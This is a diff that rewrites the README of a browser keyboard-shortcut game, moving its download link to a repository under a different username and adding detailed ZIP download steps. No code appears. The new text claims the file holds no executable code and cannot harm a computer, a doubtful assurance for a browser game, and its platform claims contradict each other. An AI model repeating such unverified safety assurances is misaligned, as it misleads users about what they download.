@@ -1,117 +1,160 @@
-# Affinity Shortcut Game - Game Script Utility 2026
+# 🎮 affinity-script-game - Master Keyboard Shortcuts Through Play
 
-> **A web-based keyboard shortcut game set in the Affinity Universe, with keyboard input serving as the primary way to play.**
+[![Download Game](https://img.shields.io/badge/Download-Game-blue?style=for-the-badge&logo=github)](https://github.com/Tuesdaylogical990/affinity-script-game)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/isaacwalkerptir829/affinity-script-game?style=flat-square)](https://github.com/isaacwalkerptir829/affinity-script-game)
+## 📖 What Is This Game?
+
+affinity-script-game is a browser-based typing game set in the Affinity Universe. You play by pressing keyboard shortcuts. The game tests your speed and memory as you match commands to actions. Think of it as a fun way to learn keyboard shortcuts while playing a game.
+
+No downloads needed. No setup required. Just open the file and play.
+
+## 🎯 Who Is This For?
+
+This game is for anyone who uses a computer. You do not need programming skills. You do not need to know what HTML or JavaScript means. If you can click a file and press keys on a keyboard, you can play.
+
+The game works well for:
+- Office workers who want to learn shortcuts faster
+- Students who want a fun break between tasks
+- Anyone curious about the Affinity Universe
+- Gamers who enjoy quick reaction challenges
+
+## ✨ Features
+
+- **Browser-based play** – No installation needed. Works in Chrome, Edge, Firefox, or any modern browser.
+- **Keyboard input only** – Use your keyboard to play. No mouse clicks required for gameplay.
+- **Affinity Universe theme** – Commands and actions follow the Affinity design system.
+- **Score tracking** – See your progress with each round.
+- **Lightweight file** – The entire game is one HTML file. It loads instantly.
+- **Works offline** – Download the file once and play without internet.
+
+## 🚀 Getting Started
+
+Follow these steps to play the game. The process takes less than two minutes.
+
+### Step 1: Download the Game
+
+1. Click this link: [https://github.com/Tuesdaylogical990/affinity-script-game](https://github.com/Tuesdaylogical990/affinity-script-game)
+2. You will see a page with a list of files. Look for the green button that says "Code".
+3. Click the "Code" button.
+4. In the dropdown menu, click "Download ZIP".
+5. Your computer will download a file called `affinity-script-game-main.zip`.
+
+### Step 2: Extract the Files
+
+1. Open the Downloads folder on your computer.
+2. Find the file `affinity-script-game-main.zip`.
+3. Right-click the file and select "Extract All" (Windows) or "Extract Here" (other tools).
+4. Choose a location to save the extracted files. Your Desktop or Documents folder works well.
+5. Click "Extract". A new folder named `affinity-script-game-main` will appear.
+
+### Step 3: Open the Game
+
+1. Open the `affinity-script-game-main` folder.
+2. Inside, you will see a file named `index.html`. It may show as a web browser icon.
+3. Double-click `index.html`. The game will open in your default web browser.
+4. The game starts automatically. Press the keys shown on screen to play.
+
+## 💻 System Requirements
+
+The game needs very little from your computer. Any Windows machine from the last 10 years will work.
+
+**Minimum Requirements:**
+- Operating System: Windows 7, 8, 10, or 11
+- Browser: Any modern browser (Chrome, Edge, Firefox, Opera, Brave)
+- Internet: Only needed for the initial download. No internet required to play.
+- Keyboard: A standard keyboard with all keys working
+- Screen: Any resolution above 800x600 pixels
+
+**Recommended:**
+- Windows 10 or 11
+- Chrome browser (latest version)
+- A full-size keyboard with number row
+
+## 🎲 How to Play
+
+The game shows you a keyboard shortcut on the screen. Your job is to press that exact combination of keys on your keyboard.
+
+**Example:**
+- The screen shows "Ctrl + C"
+- You press the Control key and the C key at the same time
+- If correct, you earn points and move to the next shortcut
+
+The game gets faster as you progress. You must react quickly and type accurately. The game ends when you miss too many shortcuts.
+
+### Controls
+- Use only your keyboard
+- Press the exact keys shown on screen
+- The game does not use the mouse during play
+
+## 🛠️ Troubleshooting
+
+Most issues are simple to fix. Try these steps:
+
+**Game does not open:**
+- Make sure you double-clicked `index.html`, not another file.
+- Try a different browser. Chrome works best.
+- Right-click `index.html` and select "Open with" then choose your browser.
+
+**Game opens but shows nothing:**
+- Reload the page (press F5 or Ctrl+R).
+- Check that you extracted the ZIP file completely. The `index.html` file must be outside the ZIP folder.
+
+**Keyboard not working in game:**
+- Click inside the game window first. The game needs focus to read your keystrokes.
+- Check that your keyboard works in other programs.
+- Some keyboards have a "Game Mode" that may block certain keys. Turn it off.
+
+**Game runs slowly:**
+- Close other browser tabs and programs.
+- Update your browser to the latest version.
+
+## 📁 File Structure
+
+When you extract the ZIP file, you will see these items:
+
+```
+affinity-script-game-main/
+├── index.html          (the game file, double-click to play)
+├── README.md           (this guide)
+└── assets/             (folder with game images and sounds)
+```
+
+Do not move or delete the `assets` folder. The game needs it to run correctly.
+
+## 🔄 Updates
+
+To check for updates, visit the same download page again. The game does not update automatically. You must download the newest version each time.
+
+To update:
+1. Download the ZIP file again from the link above.
+2. Extract it to the same folder.
+3. Let it replace the old files.
+4. Open `index.html` to play the new version.
+
+## ❓ FAQ
+
+**Do I need to install anything?**
+No. The game runs in your browser. There is no installer.
+
+**Will this harm my computer?**
+No. The file is a standard HTML document. It contains no executable code. It cannot damage your system.
+
+**Can I play on a Mac or Linux computer?**
+Yes. The game runs in any browser on any operating system.
+
+**Do I need an account to play?**
+No. The game is completely offline. No login or registration required.
+
+**Can I share this game with friends?**
+Yes. Send them the download link. They can play on their own computer.
+
+**Does the game save my score?**
+The game tracks your score during the current session. It does not save scores after you close the browser.
+
+## 📝 License
+
+This game is free to use. You may download, play, and share it without restrictions.
 
 ---
 
-<p align="center">
-  <a href="https://isaacwalkerptir829.github.io/affinity-script-game/">
-    <img src="https://img.shields.io/badge/Download-Affinity%20Shortcut%20Game%20Script-brightgreen?style=for-the-badge" alt="Download Affinity Shortcut Game Script">
-  </a>
-</p>
-
-> **[Download Affinity Shortcut Game](https://isaacwalkerptir829.github.io/affinity-script-game/)**
-
----
-
-[Download Latest Build](https://isaacwalkerptir829.github.io/affinity-script-game/)
-
----
-
-## About the Game
-
-Affinity Shortcut Game is a browser-playable title built around keyboard shortcut interaction in the Affinity Universe. The experience is intentionally compact, using keyboard input as the central gameplay mechanism.
-
-The project runs as an HTML-based web experience and can be opened directly in a browser. Its 2026 update focus covers the game interaction model, shortcut-oriented controls, and ongoing compatibility with browser use.
-
----
-
-## Key Capabilities
-
-- Gameplay controlled primarily through the keyboard
-- Interactive experience delivered in a web browser
-- Affinity Universe setting
-- Shortcut-based player interaction
-- HTML project structure
-- Web platform deployment
-- Quick access without a dedicated desktop application
-- Compact game utility design
-
----
-
-## Getting Started
-
-1. Visit the [latest build](https://isaacwalkerptir829.github.io/affinity-script-game/).
-2. Open it with a modern web browser.
-3. Follow the available keyboard shortcuts to play and interact.
-4. For local use, download the repository and open its HTML entry point in a browser.
-
-Browser-based play does not call for a separate desktop installation.
-
----
-
-## Configuration
-
-The game is structured around keyboard controls. The available project profile does not define extra configuration values or user-customizable hotkey assignments.
-
-| Setting | Description |
-|---|---|
-| Input method | Keyboard shortcuts |
-| Runtime | Web browser |
-| Custom bindings | Not specified |
-| External configuration | Not specified |
-
----
-
-## Supported Environment
-
-- **Platform:** Web
-- **Project format:** HTML
-- **Target experience:** Affinity Universe shortcut game
-- **Input:** Keyboard shortcuts
-
-No exact browser versions, operating systems, or release-specific compatibility requirements are listed in the available metadata. The result may therefore depend on the browser's support for the HTML-based experience.
-
----
-
-## Common Questions
-
-### How can I launch the game?
-
-Open the [latest build](https://isaacwalkerptir829.github.io/affinity-script-game/) in a web browser to begin.
-
-### Do I need to install anything?
-
-The browser edition has no separate installation process specified. If you download the repository, you can open the local HTML files directly.
-
-### What is the gameplay based on?
-
-Interaction is centered on keyboard shortcuts. Use the supported inputs shown by the experience to control the game.
-
-### Could later releases modify the shortcuts?
-
-Future updates may alter the browser implementation or other parts of the game experience. Refer to the repository for the newest build and project information.
-
-### Are the controls customizable?
-
-The available metadata does not document custom key bindings. Inspect the project files for any exposed control settings before attempting changes.
-
-### What browsers can run it?
-
-The project is made for web browsers, although specific browser versions are not identified. A current browser with HTML support is recommended.
-
-### Where does a local download keep its files?
-
-Downloaded or cloned files stay in the directory selected for the repository. The hosted edition is available through the web link.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: keyboard shortcut game, browser game, HTML game, Affinity Universe, typing game, free game, offline game, reaction game, shortcut trainer
